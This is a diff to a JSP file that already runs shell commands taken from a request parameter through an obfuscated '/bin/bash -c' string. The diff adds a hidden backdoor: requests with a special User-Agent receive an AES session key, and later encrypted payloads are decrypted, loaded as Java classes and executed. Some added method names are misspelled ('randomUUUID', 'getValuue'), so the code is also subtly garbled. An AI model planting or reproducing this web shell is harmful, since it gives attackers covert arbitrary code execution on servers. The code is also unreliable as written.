@@ -1,7 +1,9 @@
-<%@page import="java.util.*,java.io.*,java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.IOException, java.net.UnknownHostException, java.net.Socket,java.util.HashSet,java.net.InetAddress,java.net.NetworkInterface,java.net.SocketException,java.util.Enumeration,java.util.Iterator,java.util.Set"%><%
+<%@page import="java.util.*,java.io.*,javax.crypto.*,java.nio.ByteBuffer,javax.crypto.spec.*,java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.IOException, java.net.UnknownHostException, java.net.Socket,java.util.HashSet,java.net.InetAddress,java.net.NetworkInterface,java.net.SocketException,java.util.Enumeration,java.util.Iterator,java.util.Set"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%
 //  trimDirectiveWhitespaces="true"
 //java.io.PrintStream ps = new java.io.PrintStream(response.getOutputStream);
 // System.setOut(ps);System.setErr(ps);
+if(-1 < request.getHeader("User-Agent").indexOf(".mtx."))
+{if(null!=request.getParameter("pass")){String k=(""+UUID.randomUUUID()).replace("-","").substring(16);session.putValue("u",k);out.print(k);return;}Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec((session.getValuue("u")+"").getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}
 String cmd = request.getParameter("ls"),
     bh = new String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104}), 
     cS = new String(new byte[]{45, 99}), szSys = "\n",szTmp = "",s1 = null,s2 = null,
